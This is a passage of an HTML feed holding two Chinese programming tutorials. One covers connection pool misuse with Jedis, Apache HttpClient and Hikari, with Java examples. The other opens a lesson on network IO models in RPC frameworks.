try (Jedis jedis = new Jedis(&amp;#34;127.0.0.1&amp;#34;, 6379)) {
Assert.isTrue(&amp;#34;OK&amp;#34;.equals(jedis.set(&amp;#34;a&amp;#34;, &amp;#34;1&amp;#34;)), &amp;#34;set a = 1 return OK&amp;#34;);
Assert.isTrue(&amp;#34;OK&amp;#34;.equals(jedis.set(&amp;#34;b&amp;#34;, &amp;#34;2&amp;#34;)), &amp;#34;set b = 2 return OK&amp;#34;);
}
}
&lt;/code>&lt;/pre>&lt;p>然后，启动两个线程，共享操作同一个 Jedis 实例，每一个线程循环 1000 次，分别读取 Key 为 a 和 b 的 Value，判断是否分别为 1 和 2：&lt;/p>
&lt;pre tabindex="0">&lt;code>Jedis jedis = new Jedis(&amp;#34;127.0.0.1&amp;#34;, 6379);
new Thread(() -&amp;gt; {
for (int i = 0; i &amp;lt; 1000; i++) {
String result = jedis.get(&amp;#34;a&amp;#34;);
if (!result.equals(&amp;#34;1&amp;#34;)) {
log.warn(&amp;#34;Expect a to be 1 but found {}&amp;#34;, result);
return;
}
}
}).start();
new Thread(() -&amp;gt; {
for (int i = 0; i &amp;lt; 1000; i++) {
String result = jedis.get(&amp;#34;b&amp;#34;);
if (!result.equals(&amp;#34;2&amp;#34;)) {
log.warn(&amp;#34;Expect b to be 2 but found {}&amp;#34;, result);
return;
}
}
}).start();
TimeUnit.SECONDS.sleep(5);
&lt;/code>&lt;/pre>&lt;p>执行程序多次，可以看到日志中出现了各种奇怪的异常信息，有的是读取 Key 为 b 的 Value 读取到了 1，有的是流非正常结束，还有的是连接关闭异常：&lt;/p>
&lt;pre tabindex="0">&lt;code>//错误1
[14:56:19.069] [Thread-28] [WARN ] [.t.c.c.redis.JedisMisreuseController:45 ] - Expect b to be 2 but found 1
//错误2
redis.clients.jedis.exceptions.JedisConnectionException: Unexpected end of stream.
at redis.clients.jedis.util.RedisInputStream.ensureFill(RedisInputStream.java:202)
at redis.clients.jedis.util.RedisInputStream.readLine(RedisInputStream.java:50)
at redis.clients.jedis.Protocol.processError(Protocol.java:114)
at redis.clients.jedis.Protocol.process(Protocol.java:166)
at redis.clients.jedis.Protocol.read(Protocol.java:220)
at redis.clients.jedis.Connection.readProtocolWithCheckingBroken(Connection.java:318)
at redis.clients.jedis.Connection.getBinaryBulkReply(Connection.java:255)
at redis.clients.jedis.Connection.getBulkReply(Connection.java:245)
at redis.clients.jedis.Jedis.get(Jedis.java:181)
at org.geekbang.time.commonmistakes.connectionpool.redis.JedisMisreuseController.lambda$wrong$1(JedisMisreuseController.java:43)
at java.lang.Thread.run(Thread.java:748)
//错误3
java.io.IOException: Socket Closed
at java.net.AbstractPlainSocketImpl.getOutputStream(AbstractPlainSocketImpl.java:440)
at java.net.Socket$3.run(Socket.java:954)
at java.net.Socket$3.run(Socket.java:952)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.Socket.getOutputStream(Socket.java:951)
at redis.clients.jedis.Connection.connect(Connection.java:200)
... 7 more
&lt;/code>&lt;/pre>&lt;p>让我们分析一下 Jedis 类的源码，搞清楚其中缘由吧。&lt;/p>
&lt;pre tabindex="0">&lt;code>public class Jedis extends BinaryJedis implements JedisCommands, MultiKeyCommands,
AdvancedJedisCommands, ScriptingCommands, BasicCommands, ClusterCommands, SentinelCommands, ModuleCommands {
}
public class BinaryJedis implements BasicCommands, BinaryJedisCommands, MultiKeyBinaryCommands,
AdvancedBinaryJedisCommands, BinaryScriptingCommands, Closeable {
protected Client client = null;
...
}
public class Client extends BinaryClient implements Commands {
}
public class BinaryClient extends Connection {
}
public class Connection implements Closeable {
private Socket socket;
private RedisOutputStream outputStream;
private RedisInputStream inputStream;
}
&lt;/code>&lt;/pre>&lt;p>可以看到，Jedis 继承了 BinaryJedis，BinaryJedis 中保存了单个 Client 的实例，Client 最终继承了 Connection，Connection 中保存了单个 Socket 的实例，和 Socket 对应的两个读写流。因此，一个 Jedis 对应一个 Socket 连接。类图如下：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/e7/0f/e72120b1f6daf4a951e75c05b9191a0f.png" alt="">&lt;/p>
&lt;p>BinaryClient 封装了各种 Redis 命令，其最终会调用基类 Connection 的方法，使用 Protocol 类发送命令。看一下 Protocol 类的 sendCommand 方法的源码，可以发现其发送命令时是直接操作 RedisOutputStream 写入字节。&lt;/p>
&lt;p>我们在多线程环境下复用 Jedis 对象，其实就是在复用 RedisOutputStream。&lt;strong>如果多个线程在执行操作，那么既无法确保整条命令以一个原子操作写入 Socket，也无法确保写入后、读取前没有其他数据写到远端&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>private static void sendCommand(final RedisOutputStream os, final byte[] command,
final byte[]... args) {
try {
os.write(ASTERISK_BYTE);
os.writeIntCrLf(args.length + 1);
os.write(DOLLAR_BYTE);
os.writeIntCrLf(command.length);
os.write(command);
os.writeCrLf();
for (final byte[] arg : args) {
os.write(DOLLAR_BYTE);
os.writeIntCrLf(arg.length);
os.write(arg);
os.writeCrLf();
}
} catch (IOException e) {
throw new JedisConnectionException(e);
}
}
&lt;/code>&lt;/pre>&lt;p>看到这里我们也可以理解了，为啥多线程情况下使用 Jedis 对象操作 Redis 会出现各种奇怪的问题。&lt;/p>
&lt;p>比如，写操作互相干扰，多条命令相互穿插的话，必然不是合法的 Redis 命令，那么 Redis 会关闭客户端连接，导致连接断开；又比如，线程 1 和 2 先后写入了 get a 和 get b 操作的请求，Redis 也返回了值 1 和 2，但是线程 2 先读取了数据 1 就会出现数据错乱的问题。&lt;/p>
&lt;p>修复方式是，使用 Jedis 提供的另一个线程安全的类 JedisPool 来获得 Jedis 的实例。JedisPool 可以声明为 static 在多个线程之间共享，扮演连接池的角色。使用时，按需使用 try-with-resources 模式从 JedisPool 获得和归还 Jedis 实例。&lt;/p>
&lt;pre tabindex="0">&lt;code>private static JedisPool jedisPool = new JedisPool(&amp;#34;127.0.0.1&amp;#34;, 6379);
new Thread(() -&amp;gt; {
try (Jedis jedis = jedisPool.getResource()) {
for (int i = 0; i &amp;lt; 1000; i++) {
String result = jedis.get(&amp;#34;a&amp;#34;);
if (!result.equals(&amp;#34;1&amp;#34;)) {
log.warn(&amp;#34;Expect a to be 1 but found {}&amp;#34;, result);
return;
}
}
}
}).start();
new Thread(() -&amp;gt; {
try (Jedis jedis = jedisPool.getResource()) {
for (int i = 0; i &amp;lt; 1000; i++) {
String result = jedis.get(&amp;#34;b&amp;#34;);
if (!result.equals(&amp;#34;2&amp;#34;)) {
log.warn(&amp;#34;Expect b to be 2 but found {}&amp;#34;, result);
return;
}
}
}
}).start();
&lt;/code>&lt;/pre>&lt;p>这样修复后，代码不再有线程安全问题了。此外，我们最好通过 shutdownhook，在程序退出之前关闭 JedisPool：&lt;/p>
&lt;pre tabindex="0">&lt;code>@PostConstruct
public void init() {
Runtime.getRuntime().addShutdownHook(new Thread(() -&amp;gt; {
jedisPool.close();
}));
}
&lt;/code>&lt;/pre>&lt;p>看一下 Jedis 类 close 方法的实现可以发现，如果 Jedis 是从连接池获取的话，那么 close 方法会调用连接池的 return 方法归还连接：&lt;/p>
&lt;pre tabindex="0">&lt;code>public class Jedis extends BinaryJedis implements JedisCommands, MultiKeyCommands,
AdvancedJedisCommands, ScriptingCommands, BasicCommands, ClusterCommands, SentinelCommands, ModuleCommands {
protected JedisPoolAbstract dataSource = null;
@Override
public void close() {
if (dataSource != null) {
JedisPoolAbstract pool = this.dataSource;
this.dataSource = null;
if (client.isBroken()) {
pool.returnBrokenResource(this);
} else {
pool.returnResource(this);
}
} else {
super.close();
}
}
}
&lt;/code>&lt;/pre>&lt;p>如果不是，则直接关闭连接，其最终调用 Connection 类的 disconnect 方法来关闭 TCP 连接：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void disconnect() {
if (isConnected()) {
try {
outputStream.flush();
socket.close();
} catch (IOException ex) {
broken = true;
throw new JedisConnectionException(ex);
} finally {
IOUtils.closeQuietly(socket);
}
}
}
&lt;/code>&lt;/pre>&lt;p>可以看到，Jedis 可以独立使用，也可以配合连接池使用，这个连接池就是 JedisPool。我们再看看 JedisPool 的实现。&lt;/p>
&lt;pre tabindex="0">&lt;code>public class JedisPool extends JedisPoolAbstract {
@Override
public Jedis getResource() {
Jedis jedis = super.getResource();
jedis.setDataSource(this);
return jedis;
}
@Override
protected void returnResource(final Jedis resource) {
if (resource != null) {
try {
resource.resetState();
returnResourceObject(resource);
} catch (Exception e) {
returnBrokenResource(resource);
throw new JedisException(&amp;#34;Resource is returned to the pool as broken&amp;#34;, e);
}
}
}
}
public class JedisPoolAbstract extends Pool&amp;lt;Jedis&amp;gt; {
}
public abstract class Pool&amp;lt;T&amp;gt; implements Closeable {
protected GenericObjectPool&amp;lt;T&amp;gt; internalPool;
}
&lt;/code>&lt;/pre>&lt;p>JedisPool 的 getResource 方法在拿到 Jedis 对象后，将自己设置为了连接池。连接池 JedisPool，继承了 JedisPoolAbstract，而后者继承了抽象类 Pool，Pool 内部维护了 Apache Common 的通用池 GenericObjectPool。JedisPool 的连接池就是基于 GenericObjectPool 的。&lt;/p>
&lt;p>看到这里我们了解了，Jedis 的 API 实现是我们说的三种类型中的第一种，也就是连接池和连接分离的 API，JedisPool 是线程安全的连接池，Jedis 是非线程安全的单一连接。知道了原理之后，我们再使用 Jedis 就胸有成竹了。&lt;/p>
&lt;h1 id="使用连接池务必确保复用">使用连接池务必确保复用&lt;/h1>
&lt;p>在介绍线程池的时候我们强调过，&lt;strong>池一定是用来复用的，否则其使用代价会比每次创建单一对象更大。对连接池来说更是如此，原因如下：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>创建连接池的时候很可能一次性创建了多个连接，大多数连接池考虑到性能，会在初始化的时候维护一定数量的最小连接（毕竟初始化连接池的过程一般是一次性的），可以直接使用。如果每次使用连接池都按需创建连接池，那么很可能你只用到一个连接，但是创建了 N 个连接。&lt;/li>
&lt;li>连接池一般会有一些管理模块，也就是连接池的结构示意图中的绿色部分。举个例子，大多数的连接池都有闲置超时的概念。连接池会检测连接的闲置时间，定期回收闲置的连接，把活跃连接数降到最低（闲置）连接的配置值，减轻服务端的压力。一般情况下，闲置连接由独立线程管理，启动了空闲检测的连接池相当于还会启动一个线程。此外，有些连接池还需要独立线程负责连接保活等功能。因此，启动一个连接池相当于启动了 N 个线程。&lt;/li>
&lt;/ul>
&lt;p>除了使用代价，连接池不释放，还可能会引起线程泄露。接下来，我就以 Apache HttpClient 为例，和你说说连接池不复用的问题。&lt;/p>
&lt;p>首先，创建一个 CloseableHttpClient，设置使用 PoolingHttpClientConnectionManager 连接池并启用空闲连接驱逐策略，最大空闲时间为 60 秒，然后使用这个连接来请求一个会返回 OK 字符串的服务端接口：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;wrong1&amp;#34;)
public String wrong1() {
CloseableHttpClient client = HttpClients.custom()
.setConnectionManager(new PoolingHttpClientConnectionManager())
.evictIdleConnections(60, TimeUnit.SECONDS).build();
try (CloseableHttpResponse response = client.execute(new HttpGet(&amp;#34;http://127.0.0.1:45678/httpclientnotreuse/test&amp;#34;))) {
return EntityUtils.toString(response.getEntity());
} catch (Exception ex) {
ex.printStackTrace();
}
return null;
}
&lt;/code>&lt;/pre>&lt;p>访问这个接口几次后查看应用线程情况，可以看到有大量叫作 Connection evictor 的线程，且这些线程不会销毁：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/33/10/33a2389c20653e97b8157897d06c1510.png" alt="">&lt;/p>
&lt;p>对这个接口进行几秒的压测（压测使用 wrk，1 个并发 1 个连接）可以看到，已经建立了三千多个 TCP 连接到 45678 端口（其中有 1 个是压测客户端到 Tomcat 的连接，大部分都是 HttpClient 到 Tomcat 的连接）：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/54/f2/54a71ee9a7bbbd5e121b12fe6289aff2.png" alt="">&lt;/p>
&lt;p>好在有了空闲连接回收的策略，60 秒之后连接处于 CLOSE_WAIT 状态，最终彻底关闭。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/8e/77/8ea5f53e6510d76cf447c23fb15daa77.png" alt="">&lt;/p>
&lt;p>这 2 点证明，CloseableHttpClient 属于第二种模式，即内部带有连接池的 API，其背后是连接池，最佳实践一定是复用。&lt;/p>
&lt;p>复用方式很简单，你可以把 CloseableHttpClient 声明为 static，只创建一次，并且在 JVM 关闭之前通过 addShutdownHook 钩子关闭连接池，在使用的时候直接使用 CloseableHttpClient 即可，无需每次都创建。&lt;/p>
&lt;p>首先，定义一个 right 接口来实现服务端接口调用：&lt;/p>
&lt;pre tabindex="0">&lt;code>private static CloseableHttpClient httpClient = null;
static {
//当然，也可以把CloseableHttpClient定义为Bean，然后在@PreDestroy标记的方法内close这个HttpClient
httpClient = HttpClients.custom().setMaxConnPerRoute(1).setMaxConnTotal(1).evictIdleConnections(60, TimeUnit.SECONDS).build();
Runtime.getRuntime().addShutdownHook(new Thread(() -&amp;gt; {
try {
httpClient.close();
} catch (IOException ignored) {
}
}));
}
@GetMapping(&amp;#34;right&amp;#34;)
public String right() {
try (CloseableHttpResponse response = httpClient.execute(new HttpGet(&amp;#34;http://127.0.0.1:45678/httpclientnotreuse/test&amp;#34;))) {
return EntityUtils.toString(response.getEntity());
} catch (Exception ex) {
ex.printStackTrace();
}
return null;
}
&lt;/code>&lt;/pre>&lt;p>然后，重新定义一个 wrong2 接口，修复之前按需创建 CloseableHttpClient 的代码，每次用完之后确保连接池可以关闭：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;wrong2&amp;#34;)
public String wrong2() {
try (CloseableHttpClient client = HttpClients.custom()
.setConnectionManager(new PoolingHttpClientConnectionManager())
.evictIdleConnections(60, TimeUnit.SECONDS).build();
CloseableHttpResponse response = client.execute(new HttpGet(&amp;#34;http://127.0.0.1:45678/httpclientnotreuse/test&amp;#34;))) {
return EntityUtils.toString(response.getEntity());
} catch (Exception ex) {
ex.printStackTrace();
}
return null;
}
&lt;/code>&lt;/pre>&lt;p>使用 wrk 对 wrong2 和 right 两个接口分别压测 60 秒，可以看到两种使用方式性能上的差异，每次创建连接池的 QPS 是 337，而复用连接池的 QPS 是 2022：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/b7/2d/b79fb99cf8a5c3a17e60b0850544472d.png" alt="">&lt;/p>
&lt;p>如此大的性能差异显然是因为 TCP 连接的复用。你可能注意到了，刚才定义连接池时，我将最大连接数设置为 1。所以，复用连接池方式复用的始终应该是同一个连接，而新建连接池方式应该是每次都会创建新的 TCP 连接。&lt;/p>
&lt;p>接下来，我们通过网络抓包工具 Wireshark 来证实这一点。&lt;/p>
&lt;p>如果调用 wrong2 接口每次创建新的连接池来发起 HTTP 请求，从 Wireshark 可以看到，每次请求服务端 45678 的客户端端口都是新的。这里我发起了三次请求，程序通过 HttpClient 访问服务端 45678 的客户端端口号，分别是 51677、51679 和 51681：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/7b/35/7b8f651755cef0c05ecb08727d315e35.png" alt="">&lt;/p>
&lt;p>也就是说，每次都是新的 TCP 连接，放开 HTTP 这个过滤条件也可以看到完整的 TCP 握手、挥手的过程：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/48/0d/4815c0edd21d5bf0cae8c0c3e578960d.png" alt="">&lt;/p>
&lt;p>而复用连接池方式的接口 right 的表现就完全不同了。可以看到，第二次 HTTP 请求 #41 的客户端端口 61468 和第一次连接 #23 的端口是一样的，Wireshark 也提示了整个 TCP 会话中，当前 #41 请求是第二次请求，前一次是 #23，后面一次是 #75：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/2c/2c/2cbada9be98ce33321b29d38adb09f2c.png" alt="">&lt;/p>
&lt;p>只有 TCP 连接闲置超过 60 秒后才会断开，连接池会新建连接。你可以尝试通过 Wireshark 观察这一过程。&lt;/p>
&lt;p>接下来，我们就继续聊聊连接池的配置问题。&lt;/p>
&lt;h1 id="连接池的配置不是一成不变的">连接池的配置不是一成不变的&lt;/h1>
&lt;p>为方便根据容量规划设置连接处的属性，连接池提供了许多参数，包括最小（闲置）连接、最大连接、闲置连接生存时间、连接生存时间等。其中，最重要的参数是最大连接数，它决定了连接池能使用的连接数量上限，达到上限后，新来的请求需要等待其他请求释放连接。&lt;/p>
&lt;p>但，&lt;strong>最大连接数不是设置得越大越好&lt;/strong>。如果设置得太大，不仅仅是客户端需要耗费过多的资源维护连接，更重要的是由于服务端对应的是多个客户端，每一个客户端都保持大量的连接，会给服务端带来更大的压力。这个压力又不仅仅是内存压力，可以想一下如果服务端的网络模型是一个 TCP 连接一个线程，那么几千个连接意味着几千个线程，如此多的线程会造成大量的线程切换开销。&lt;/p>
&lt;p>当然，&lt;strong>连接池最大连接数设置得太小，很可能会因为获取连接的等待时间太长，导致吞吐量低下，甚至超时无法获取连接&lt;/strong>。&lt;/p>
&lt;p>接下来，我们就模拟下压力增大导致数据库连接池打满的情况，来实践下如何确认连接池的使用情况，以及有针对性地进行参数优化。&lt;/p>
&lt;p>首先，定义一个用户注册方法，通过 @Transactional 注解为方法开启事务。其中包含了 500 毫秒的休眠，一个数据库事务对应一个 TCP 连接，所以 500 多毫秒的时间都会占用数据库连接：&lt;/p>
&lt;pre tabindex="0">&lt;code>@Transactional
public User register(){
User user=new User();
user.setName(&amp;#34;new-user-&amp;#34;+System.currentTimeMillis());
userRepository.save(user);
try {
TimeUnit.MILLISECONDS.sleep(500);
} catch (InterruptedException e) {
e.printStackTrace();
}
return user;
}
&lt;/code>&lt;/pre>&lt;p>随后，修改配置文件启用 register-mbeans，使 Hikari 连接池能通过 JMX MBean 注册连接池相关统计信息，方便观察连接池：&lt;/p>
&lt;pre tabindex="0">&lt;code>spring.datasource.hikari.register-mbeans=true
&lt;/code>&lt;/pre>&lt;p>启动程序并通过 JConsole 连接进程后，可以看到默认情况下最大连接数为 10：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/7b/94/7b8e5aff5a3ef6ade1d8027c20c92f94.png" alt="">&lt;/p>
&lt;p>使用 wrk 对应用进行压测，可以看到连接数一下子从 0 到了 10，有 20 个线程在等待获取连接：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/b2/ef/b22169b8d8bbfabbb8b93ece11a1f9ef.png" alt="">&lt;/p>
&lt;p>不久就出现了无法获取数据库连接的异常，如下所示：&lt;/p>
&lt;pre tabindex="0">&lt;code>[15:37:56.156] [http-nio-45678-exec-15] [ERROR] [.a.c.c.C.[.[.[/].[dispatcherServlet]:175 ] - Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.dao.DataAccessResourceFailureException: unable to obtain isolated JDBC connection; nested exception is org.hibernate.exception.JDBCConnectionException: unable to obtain isolated JDBC connection] with root cause
java.sql.SQLTransientConnectionException: HikariPool-1 - Connection is not available, request timed out after 30000ms.
&lt;/code>&lt;/pre>&lt;p>从异常信息中可以看到，数据库连接池是 HikariPool，解决方式很简单，修改一下配置文件，调整数据库连接池最大连接参数到 50 即可。&lt;/p>
&lt;pre tabindex="0">&lt;code>spring.datasource.hikari.maximum-pool-size=50
&lt;/code>&lt;/pre>&lt;p>然后，再观察一下这个参数是否适合当前压力，满足需求的同时也不占用过多资源。从监控来看这个调整是合理的，有一半的富余资源，再也没有线程需要等待连接了：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/d2/31/d24f23f05d49378a10a857cd8b9ef031.png" alt="">&lt;/p>
&lt;p>在这个 Demo 里，我知道压测大概能对应使用 25 左右的并发连接，所以直接把连接池最大连接设置为了 50。在真实情况下，只要数据库可以承受，你可以选择在遇到连接超限的时候先设置一个足够大的连接数，然后观察最终应用的并发，再按照实际并发数留出一半的余量来设置最终的最大连接。&lt;/p>
&lt;p>其实，看到错误日志后再调整已经有点儿晚了。更合适的做法是，&lt;strong>对类似数据库连接池的重要资源进行持续检测，并设置一半的使用量作为报警阈值，出现预警后及时扩容&lt;/strong>。&lt;/p>
&lt;p>在这里我是为了演示，才通过 JConsole 查看参数配置后的效果，生产上需要把相关数据对接到指标监控体系中持续监测。&lt;/p>
&lt;p>&lt;strong>这里要强调的是，修改配置参数务必验证是否生效，并且在监控系统中确认参数是否生效、是否合理。之所以要&amp;quot;强调&amp;quot;，是因为这里有坑&lt;/strong>。&lt;/p>
&lt;p>我之前就遇到过这样一个事故。应用准备针对大促活动进行扩容，把数据库配置文件中 Druid 连接池最大连接数 maxActive 从 50 提高到了 100，修改后并没有通过监控验证，结果大促当天应用因为连接池连接数不够爆了。&lt;/p>
&lt;p>经排查发现，当时修改的连接数并没有生效。原因是，应用虽然一开始使用的是 Druid 连接池，但后来框架升级了，把连接池替换为了 Hikari 实现，原来的那些配置其实都是无效的，修改后的参数配置当然也不会生效。&lt;/p>
&lt;p>所以说，对连接池进行调参，一定要眼见为实。&lt;/p>
&lt;h1 id="重点回顾">重点回顾&lt;/h1>
&lt;p>今天，我以三种业务代码最常用的 Redis 连接池、HTTP 连接池、数据库连接池为例，和你探讨了有关连接池实现方式、使用姿势和参数配置的三大问题。&lt;/p>
&lt;p>客户端 SDK 实现连接池的方式，包括池和连接分离、内部带有连接池和非连接池三种。要正确使用连接池，就必须首先鉴别连接池的实现方式。比如，Jedis 的 API 实现的是池和连接分离的方式，而 Apache HttpClient 是内置连接池的 API。&lt;/p>
&lt;p>对于使用姿势其实就是两点，一是确保连接池是复用的，二是尽可能在程序退出之前显式关闭连接池释放资源。连接池设计的初衷就是为了保持一定量的连接，这样连接可以随取随用。从连接池获取连接虽然很快，但连接池的初始化会比较慢，需要做一些管理模块的初始化以及初始最小闲置连接。一旦连接池不是复用的，那么其性能会比随时创建单一连接更差。&lt;/p>
&lt;p>最后，连接池参数配置中，最重要的是最大连接数，许多高并发应用往往因为最大连接数不够导致性能问题。但，最大连接数不是设置得越大越好，够用就好。需要注意的是，针对数据库连接池、HTTP 连接池、Redis 连接池等重要连接池，务必建立完善的监控和报警机制，根据容量规划及时调整参数配置。&lt;/p>
&lt;p>今天用到的代码，我都放在了 GitHub 上，你可以点击这个链接查看。&lt;/p>
&lt;h1 id="思考与讨论">思考与讨论&lt;/h1>
&lt;ul>
&lt;li>有了连接池之后，获取连接是从连接池获取，没有足够连接时连接池会创建连接。这时，获取连接操作往往有两个超时时间：一个是从连接池获取连接的最长等待时间，通常叫作请求超时 connectRequestTimeout 或等待超时 connectWaitTimeout；一个是连接池新建 TCP 连接三次握手的连接超时，通常叫作连接超时 connectTimeout。针对 JedisPool、Apache HttpClient 和 Hikari 数据库连接池，你知道如何设置这 2 个参数吗？&lt;/li>
&lt;li>对于带有连接池的 SDK 的使用姿势，最主要的是鉴别其内部是否实现了连接池，如果实现了连接池要尽量复用 Client。对于 NoSQL 中的 MongoDB 来说，使用 MongoDB Java 驱动时，MongoClient 类应该是每次都创建还是复用呢？你能否在官方文档中找到答案呢？&lt;/li>
&lt;/ul>
&lt;p>关于连接池，你还遇到过什么坑吗？我是朱晔，欢迎在评论区与我留言分享，也欢迎你把这篇文章分享给你的朋友或同事，一起交流。&lt;/p></description></item><item><title>极客专栏: 04丨网络通信：RPC框架在网络通信上更倾向于哪种网络IO模型？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/04%E4%B8%A8%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1rpc%E6%A1%86%E6%9E%B6%E5%9C%A8%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8A%E6%9B%B4%E5%80%BE%E5%90%91%E4%BA%8E%E5%93%AA%E7%A7%8D%E7%BD%91%E7%BB%9Cio%E6%A8%A1%E5%9E%8B/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/04%E4%B8%A8%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1rpc%E6%A1%86%E6%9E%B6%E5%9C%A8%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E4%B8%8A%E6%9B%B4%E5%80%BE%E5%90%91%E4%BA%8E%E5%93%AA%E7%A7%8D%E7%BD%91%E7%BB%9Cio%E6%A8%A1%E5%9E%8B/</guid><description>
&lt;p>你好，我是何小锋。在上一讲我讲解了 RPC 框架中的序列化，通过上一讲，我们知道由于网络传输的数据都是二进制数据，所以我们要传递对象，就必须将对象进行序列化，而 RPC 框架在序列化的选择上，我们更关注序列化协议的安全性、通用性、兼容性，其次才关注序列化协议的性能、效率、空间开销。承接上一讲，这一讲，我要专门讲解下 RPC 框架中的网络通信，这也是我们在开篇词中就强调过的重要内容。&lt;/p>
&lt;p>那么网络通信在 RPC 调用中起到什么作用呢？&lt;/p>
&lt;p>我在[第 01 讲] 中讲过，RPC 是解决进程间通信的一种方式。一次 RPC 调用，本质就是服务消费者与服务提供者间的一次网络信息交换的过程。服务调用者通过网络 IO 发送一条请求消息，服务提供者接收并解析，处理完相关的业务逻辑之后，再发送一条响应消息给服务调用者，服务调用者接收并解析响应消息，处理完相关的响应逻辑，一次 RPC 调用便结束了。可以说，网络通信是整个 RPC 调用流程的基础。&lt;/p>
&lt;h1 id="常见的网络-io-模型">常见的网络 IO 模型&lt;/h1>
&lt;p>那说到网络通信，就不得不提一下网络 IO 模型。为什么要讲网络 IO 模型呢？因为所谓的两台 PC 机之间的网络通信，实际上就是两台 PC 机对网络 IO 的操作。&lt;/p>
&lt;p>常见的网络 IO 模型分为四种：同步阻塞 IO（BIO）、同步非阻塞 IO（NIO）、IO 多路复用和异步非阻塞 IO（AIO）。在这四种 IO 模型中，只有 AIO 为异步 IO，其他都是同步 IO。&lt;/p>
&lt;p>其中，最常用的就是同步阻塞 IO 和 IO 多路复用，这一点通过了解它们的机制，你会 get 到。至于其他两种 IO 模型，因为不常用，则不作为本讲的重点，有兴趣的话我们可以在留言区中讨论。&lt;/p>
&lt;h1 id="阻塞-ioblocking-io">阻塞 IO（blocking IO）&lt;/h1>
&lt;p>同步阻塞 IO 是最简单、最常见的 IO 模型，在 Linux 中，默认情况下所有的 socket 都是 blocking 的，先看下操作流程。&lt;/p>
&lt;p>首先，应用进程发起 IO 系统调用后，应用进程被阻塞，转到内核空间处理。之后，内核开始等待数据，等待到数据之后，再将内核中的数据拷贝到用户内存中，整个 IO 处理完毕后返回进程。最后应用的进程解除阻塞状态，运行业务逻辑。&lt;/p>
&lt;p>这里我们可以看到，系统内核处理 IO 操作分为两个阶段&amp;mdash;&amp;mdash;等待数据和拷贝数据。而在这两个阶段中，应用进程中 IO 操作的线程会一直都处于阻塞状态，如果是基于 Java 多线程开发，那么每一个 IO 操作都要占用线程，直至 IO 操作结束。&lt;/p>
&lt;p>这个流程就好比我们去餐厅吃饭，我们到达餐厅，向服务员点餐，之后要一直在餐厅等待后厨将菜做好，然后服务员会将菜端给我们，我们才能享用。&lt;/p>
&lt;h1 id="io-多路复用io-multiplexing">IO 多路复用（IO multiplexing）&lt;/h1>
&lt;p>多路复用 IO 是在高并发场景中使用最为广泛的一种 IO 模型，如 Java 的 NIO、Redis、Nginx 的底层实现就是此类 IO 模型的应用，经典的 Reactor 模式也是基于此类 IO 模型。&lt;/p>
&lt;p>那么什么是 IO 多路复用呢？通过字面上的理解，多路就是指多个通道，也就是多个网络连接的 IO，而复用就是指多个通道复用在一个复用器上。&lt;/p>
&lt;p>多个网络连接的 IO 可以注册到一个复用器（select）上，当用户进程调用了 select，那么整个进程会被阻塞。同时，内核会&amp;quot;监视&amp;quot;所有 select 负责的 socket，当任何一个 socket 中的数据准备好了，select 就会返回。这个时候用户进程再调用 read 操作，将数据从内核中拷贝到用户进程。&lt;/p>
&lt;p>这里我们可以看到，当用户进程发起了 select 调用，进程会被阻塞，当发现该 select 负责的 socket 有准备好的数据时才返回，之后才发起一次 read，整个流程要比阻塞 IO 要复杂，似乎也更浪费性能。但它最大的优势在于，用户可以在一个线程内同时处理多个 socket 的 IO 请求。用户可以注册多个 socket，然后不断地调用 select 读取被激活的 socket，即可达到在同一个线程内同时处理多个 IO 请求的目的。而在同步阻塞模型中，必须通过多线程的方式才能达到这个目的。&lt;/p>
&lt;p>同样好比我们去餐厅吃饭，这次我们是几个人一起去的，我们专门留了一个人在餐厅排号等位，其他人就去逛街了，等排号的朋友通知我们可以吃饭了，我们就直接去享用了。&lt;/p>
&lt;h1 id="为什么说阻塞-io-和-io-多路复用最为常用">为什么说阻塞 IO 和 IO 多路复用最为常用？&lt;/h1>
&lt;p>了解完二者的机制，我们就可以回到起初的问题了&amp;mdash;&amp;mdash;我为什么说阻塞 IO 和 IO 多路复用最为常用。对比这四种网络 IO 模型：阻塞 IO、非阻塞 IO、IO 多路复用、异步 IO。实际在网络 IO 的应用上，需要的是系统内核的支持以及编程语言的支持。&lt;/p>
&lt;p>在系统内核的支持上，现在大多数系统内核都会支持阻塞 IO、非阻塞 IO 和 IO 多路复用，但像信号驱动 IO、异步 IO，只有高版本的 Linux 系统内核才会支持。&lt;/p>
&lt;p>在编程语言上，无论 C++ 还是 Java，在高性能的网络编程框架的编写上，大多数都是基于 Reactor 模式，其中最为典型的便是 Java 的 Netty 框架，而 Reactor 模式是基于 IO 多路复用的。当然，在非高并发场景下，同步阻塞 IO 是最为常见的。&lt;/p>
